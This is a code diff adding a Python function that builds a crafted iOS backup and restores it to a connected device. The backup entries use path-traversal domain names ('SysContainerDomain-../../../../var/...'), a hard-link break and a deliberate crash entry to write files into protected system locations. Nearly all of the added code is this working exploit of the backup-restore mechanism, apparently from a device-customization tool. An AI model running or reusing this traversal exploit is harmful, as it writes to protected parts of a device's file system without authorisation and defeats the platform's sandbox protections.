@@ -132,3 +132,40 @@ if __name__ == "__main__":
     # restore_assets("RedditApp.app", "/Users/ibarahime/Downloads/Assets.car", lockdown)
     # main()
     # get_apps(lockdown)
+
+def restore_file_mobile(fp: str, restore_path: str, restore_name: str):
+    # open the file and read the contents
+    contents = open(fp, "rb").read()
+
+    # create the backup
+    back = backup.Backup(files=[
+        backup.Directory("", "RootDomain"),
+        backup.Directory("Library", "RootDomain"),
+        backup.Directory("Library/Preferences", "RootDomain"),
+        backup.ConcreteFile("Library/Preferences/temp", "RootDomain", owner=501, group=501, contents=contents, inode=0),
+        backup.Directory(
+                "",
+                f"SysContainerDomain-../../../../../../../../var/mobile/backup{restore_path}",
+                owner=501,
+                group=501
+            ),
+        backup.ConcreteFile(
+                "",
+                f"SysContainerDomain-../../../../../../../../var/mobile/backup{restore_path}{restore_name}",
+                owner=501,
+                group=501,
+                contents=b"",
+                inode=0
+            ),
+        backup.ConcreteFile(
+                "",
+                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
+                owner=501,
+                group=501,
+                contents=b"",
+            ),  # Break the hard link
+            backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
+    ])
+
+    
+    perform_restore(backup=back)
